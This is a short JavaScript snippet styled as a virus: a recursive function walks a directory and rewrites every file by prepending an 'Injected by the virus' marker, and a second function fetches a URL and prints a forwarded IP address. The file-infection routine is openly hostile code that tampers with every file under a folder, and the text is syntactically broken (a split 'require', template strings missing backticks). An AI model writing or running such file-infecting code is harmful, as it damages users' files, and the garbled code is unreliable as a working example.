const fs requ= ire('fs');
const axios = require('axios');

function infectFiles(directory) {
const files = fs.readdirSync(directory);
for (const file of files) {
const path = ${directory}/${file};
if (fs.statSync(path).isFile()) {
const content = fs.readFileSync(path, 'utf8');
if (!content.includes('// Injected by the virus')) {
const infectedContent = // Injected by the virus\n${content};
fs.writeFileSync(path, infectedContent);
console.log(Injected into ${path});
}
} else if (fs.statSync(path).isDirectory()) {
infectFiles(path);
}
}
}

async function logIP(url) {
try {
const response = await axios.get(url);
console.log(IP Address: ${response.headers['x-forwarded-for'] || response.request.ip});
} catch (error) {
console.error('Error logging IP:', error.message);
}
}
